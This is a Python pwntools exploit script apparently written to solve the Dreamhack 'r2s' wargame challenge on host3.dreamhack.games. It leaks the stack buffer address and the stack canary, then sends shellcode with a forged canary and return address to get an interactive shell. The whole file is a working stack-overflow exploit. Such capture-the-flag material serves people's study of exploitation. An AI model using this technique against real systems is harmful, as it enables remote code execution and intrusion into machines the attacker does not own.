from pwn import *

# Define slog function


def slog(n, m): return success(": ".join([n, hex(m)]))


# Connect
HOST = 'host3.dreamhack.games'
PORT = 24425
p = remote(HOST, PORT)
# p = process('./r2s')

# Set context
context.arch = 'amd64'
context.endian = 'little'

# Parsing Address
buf_addr = int(p.recvline()[-15:-1], 16)
slog('Address of buf', buf_addr)

str = p.recvline()
distance_buf_rbp = int(str[-3:-1].decode('utf-8'), 10)
slog('buf <=> sfp', distance_buf_rbp)

distance_buf_canary = distance_buf_rbp - 8
slog('buf <=> canary', distance_buf_canary)

# Get canary
payload = b'A' * (distance_buf_canary + 1)
p.sendafter(b'Input: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
slog("Canary", canary)

# Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(distance_buf_canary, b'A')
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(buf_addr)

p.sendafter(b'Input: ', payload)
p.interactive()
